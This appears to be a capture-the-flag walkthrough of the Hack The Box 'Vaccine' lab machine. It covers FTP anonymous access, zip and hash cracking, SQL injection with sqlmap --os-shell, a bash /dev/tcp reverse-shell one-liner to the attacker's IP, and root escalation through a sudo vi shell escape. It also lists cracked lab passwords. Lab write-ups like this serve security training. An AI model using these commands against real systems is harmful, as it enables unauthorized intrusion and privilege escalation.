New machine vaccine 

	First, let’s start the machine first and connect starting point server to local machine, if you are using HTB parrot machine then you don’t need to connect it.

Machine is boot up let’s enumerate the machine. 

First tart with nmap to find open port.
	Suod nmap -sC -sV 10.129.88.89 

![image](https://user-images.githubusercontent.com/49148722/212783373-47721b0e-3cd2-43fd-aaaa-090505a33563.png) 


Here we can see there are three ports open. We don’t have any credential for SSH. So lets go for FTP bus using anonymous user.

 ![image](https://user-images.githubusercontent.com/49148722/212783406-58e79f87-fc72-42fa-a7c6-704b2b5acf79.png)


As we can see there is one file is stored in ftp server, let’s get that file into our machine and see wat it contains.

I tried to unzip file, but it contains password.
 
 ![image](https://user-images.githubusercontent.com/49148722/212783418-08abb36d-54fe-4264-aeaf-9710a54f030d.png)


To crack the password, we can use john the ripper which is the best tool for password guessing.
In order to crack password successfully we need to convert zip into hash. For that we will use ziptojohn.

Now, we will type following command. 
John rockyou.txt zip.hashes

 


As we can see we crack password successfully 741852963
 

Unzip file by using the password.
 ![image](https://user-images.githubusercontent.com/49148722/212783442-01cad596-7d9d-4323-92a1-ca02a9c280d1.png)


Now we will read index.php file first.
 ![image](https://user-images.githubusercontent.com/49148722/212783448-51ee214f-eaa2-474e-a7d0-e0c8bd4e1ba7.png)


We can see the credentials of admin: 2cb42f8734ea607eefed3b70af13bbd3. Which might be able to use. Let’s creak hash first and see what it contains.

![image](https://user-images.githubusercontent.com/49148722/212783464-0d28801a-8e8e-4ddd-8914-c8163d972357.png)

We can use online tool to crack hash.

As we got plain password qwerty789.

Now we will go to web browser and login by using this password.


 ![image](https://user-images.githubusercontent.com/49148722/212783471-bda4c8b4-51f0-4170-94ba-9dea0c53c25c.png)


We login successfully. As we see here dashboard doesn’t contain anything. 
 ![image](https://user-images.githubusercontent.com/49148722/212783479-f62062c3-62e3-40e0-8cfb-b6a46f25a768.png)


By passing the query in search box. It seems sql injectable. So let use sqlmap to test it.
 
![image](https://user-images.githubusercontent.com/49148722/212783493-6ab4b100-8763-4646-bbc6-74883031a8fc.png)


First grep cookies and set into sqlmap.

 ![image](https://user-images.githubusercontent.com/49148722/212783500-721954c1-d3eb-46d9-af58-614e199e438d.png)



Here is the syntax for sqlmap : sqlmap “http://10.129.69.231/dashboard.php?search=1” --cookie="PHPSESSID=3r6efmf03uuo8cm2cqt47ddmq7" --batch
![image](https://user-images.githubusercontent.com/49148722/212783515-55f4ba20-1eb0-4ac1-ba3c-32cda0b2a93b.png)
 

The tool confirmed that the target is vulnerable to SQL injection, which is everything we needed to know. We will run the sqlmap once more, where we are going to provide the --os-shell flag, where we will be able to perform command injection:

![image](https://user-images.githubusercontent.com/49148722/212783522-20a039bb-d6ae-4c32-b7c8-4fd69fc9e808.png)

 

We got the shell; it is not stable. 
We will run the following command to establish connection with our local machine. But first we need to start listener port by using net cat.

Nc -lvnp 443
 ![image](https://user-images.githubusercontent.com/49148722/212783530-339b7217-70a6-45ef-8e2d-7ab4721c6b2b.png)


On the other hand, write a bash comment to establish connection.
bash -c "bash -i >& /dev/tcp/{your_IP}/443 0>&1"
![image](https://user-images.githubusercontent.com/49148722/212783547-8b9b6ffe-e886-41a4-bfd3-047bd246144f.png)

 
As we can see here connection has establish.
![image](https://user-images.githubusercontent.com/49148722/212783561-a52ea866-02bd-4740-88aa-5e82523d6035.png)

 

Let’s find user.txt
![image](https://user-images.githubusercontent.com/49148722/212783570-75a5b5d8-204d-4a50-8fc0-65fed869d523.png)

 

Machin is using php and sql so let’s find in /var/www/html library so we could get any important information.
![image](https://user-images.githubusercontent.com/49148722/212783584-ce00ac61-fdfe-4d4d-ab41-a68d3c194cf6.png)

 

Check each folder, we found  interesting thing in dashboard.php
![image](https://user-images.githubusercontent.com/49148722/212783607-72fe84e0-a449-4fea-b158-efb97912b346.png)

P@s5w0rd!

Now we have password for the ssh server let’s connect with it.
 ![image](https://user-images.githubusercontent.com/49148722/212783624-81f8cb17-8ad0-44be-82c0-4ebd6114d3d2.png)


We will type sudo -l to see what privilege we have.
![image](https://user-images.githubusercontent.com/49148722/212783635-0b302cf7-508a-417d-9a7a-fb8d6bf79b72.png)

 

So we have sudo privilege to edit pg_hba.conf file using vi by running sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf
![image](https://user-images.githubusercontent.com/49148722/212783660-4173e568-4adb-4379-b100-37f107c1c3d0.png)

 

We will go to GTFObins to find if we can abuse privilege.
Sudo
If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.
	sudo vi -c ':!/bin/sh' /dev/null
 ![image](https://user-images.githubusercontent.com/49148722/212783690-0b3a6ddf-5a93-4533-b480-9d164cfb92cf.png)

We are unable to execute command because sudo is restricted.

There’re alternative ways in GTFObins.

vi
:set shell=/bin/sh
:shell
First tyee vi file and then type :set shell=/bin/sh

 ![image](https://user-images.githubusercontent.com/49148722/212783704-fea40fa5-9a3f-4476-939d-3825f63744af.png)


Then type :shell
![image](https://user-images.githubusercontent.com/49148722/212783717-d091c2fa-5fba-4967-aa50-6ecd5f5eda9c.png)

 

We got root privilege now we are in root directory.

![image](https://user-images.githubusercontent.com/49148722/212783730-ff52260b-9ec3-4836-b21f-7189b2ca00b9.png)


Let’s jump into root directory and find flag
 
![image](https://user-images.githubusercontent.com/49148722/212783740-d22241a6-97f1-418d-b127-02d1458241fc.png)
